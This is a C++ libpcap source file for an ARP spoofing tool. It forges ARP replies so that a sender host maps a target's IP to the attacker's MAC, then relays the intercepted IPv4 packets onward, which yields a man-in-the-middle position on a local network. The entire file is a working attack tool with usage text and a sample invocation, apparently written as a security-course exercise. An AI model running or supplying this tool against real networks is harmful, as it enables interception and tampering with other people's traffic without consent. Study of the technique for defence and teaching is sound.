#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <string.h>
#include <time.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "net.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
struct IpMacInfo{
	char ip[16];
	char mac[18];
};
struct AttackInfo{
	IpMacInfo sender, target;
};
struct EthIpPacket{
	EthHdr eth_;
	u_char ip_vhl, ip_tos;
	u_short ip_len, ip_id, ip_off;
	u_char ip_ttl, ip_p;
	u_short ip_sum;

	u_long ip_src, ip_dst;
};

#pragma pack(pop)

void usage();
EthArpPacket makeArpPacket(char *EthSmac, char *EthDmac, char *ArpSmac,
	char *ArpSip, char *ArpTmac, char *ArpTip, int ArpHdrType);
bool sendArpPacket(pcap_t *handle, EthArpPacket *packet);

int main(int argc, char* argv[]) {
	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	int n=argc/2-1;

	char mac1[18] = "FF:FF:FF:FF:FF:FF";
	char mac0[18] = "00:00:00:00:00:00";

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	IpMacInfo attacker;
	getIPAddress(attacker.ip, dev);
	getMacAddress(attacker.mac, dev);
	printf("Attacker IP : %s\n", attacker.ip);
	printf("Attacker MAC : %s\n", attacker.mac);

	AttackInfo *attackTable;
	attackTable = (AttackInfo *)malloc(sizeof(AttackInfo)*n);

	time_t t1=time(NULL);
	while(1){
if(time(NULL)-t1 >= 10){
t1 = time(NULL);
	for (int i=0; i<n; i++){
		strcpy(attackTable[i].sender.ip, argv[i*2+2]);
		strcpy(attackTable[i].target.ip, argv[i*2+3]);
		EthArpPacket packet;

		packet = makeArpPacket(attacker.mac, mac1, attacker.mac, attacker.ip, mac0, attackTable[i].sender.ip, ArpHdr::Request);
		sendArpPacket(handle, &packet);

		packet = makeArpPacket(attacker.mac, mac1, attacker.mac, attacker.ip, mac0, attackTable[i].target.ip, ArpHdr::Request);
		sendArpPacket(handle, &packet);
	}
}



		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		if(res == -1 || res == -2){
			printf("pacap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		EthHdr *ethHdr = (EthHdr *)packet;



		if(ethHdr->type() == EthHdr::Arp){
			EthArpPacket *arpPacket = (EthArpPacket *)packet;
			char sip[16], smac[18];
			strcpy(sip, std::string(arpPacket->arp_.sip_).c_str());
			strcpy(smac, std::string(arpPacket->arp_.smac_).c_str());
//			printf("sip:%s, smac:%s\n", sip, smac);

			for(int i=0; i<n; i++){
				if(strcmp(sip, attackTable[i].sender.ip) == 0){
					strcpy(attackTable[i].sender.mac, smac);
					EthArpPacket arpPacket = makeArpPacket(attacker.mac, attackTable[i].sender.mac, attacker.mac, attackTable[i].target.ip, attackTable[i].sender.mac, attackTable[i].sender.ip, ArpHdr::Reply);
					sendArpPacket(handle, &arpPacket);
					printf("sender arp# sip:%s\tsmac:%s\n", sip, smac);
				}
				if(strcmp(sip, attackTable[i].target.ip) == 0){
					strcpy(attackTable[i].target.mac, smac);
					printf("target arp# sip:%s\tsmac:%s\n", sip, smac);
				}
			}
		}

		else if(ethHdr->type() == EthHdr::Ip4){
			EthIpPacket *ipPacket = (EthIpPacket *)packet;
			char sip[16], dip[16];
			strcpy(sip, std::string(Ip(ipPacket->ip_src)).c_str());
			strcpy(dip, std::string(Ip(ipPacket->ip_dst)).c_str());
//			printf("ip# sip:%s\tdip:%s\n", sip, dip);
			for(int i=0; i<n; i++){
				if(strcmp(sip, attackTable[i].sender.ip) == 0
				 /*&&strcmp(dip, attackTable[i].target.ip) == 0*/){
					ipPacket->eth_.dmac_ = Mac(attackTable[i].target.mac);
					ipPacket->eth_.smac_ = Mac(attacker.mac);
					pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen/*sizeof(EthHdr)+ipPacket->ip_len*/);
					printf("ip# sip:%s\tdip:%s\n", sip, dip);
				}
			}
		}
	}

	pcap_close(handle);
}

void usage() {
	printf("syntax: arp-spoof <interface> <sender ip 1> ,<target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

EthArpPacket makeArpPacket(char *EthSmac, char *EthDmac, char *ArpSmac,
	char *ArpSip, char *ArpTmac, char *ArpTip, int ArpHdrType){

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(EthDmac);
	packet.eth_.smac_ = Mac(EthSmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdrType);
	packet.arp_.smac_ = Mac(ArpSmac);
	packet.arp_.sip_ = htonl(Ip(ArpSip));
	packet.arp_.tmac_ = Mac(ArpTmac);
	packet.arp_.tip_ = htonl(Ip(ArpTip));

	return packet;
}

bool sendArpPacket(pcap_t *handle, EthArpPacket *packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return false;
	}
//	printf("success to send a packet!\n");
	return true;
}
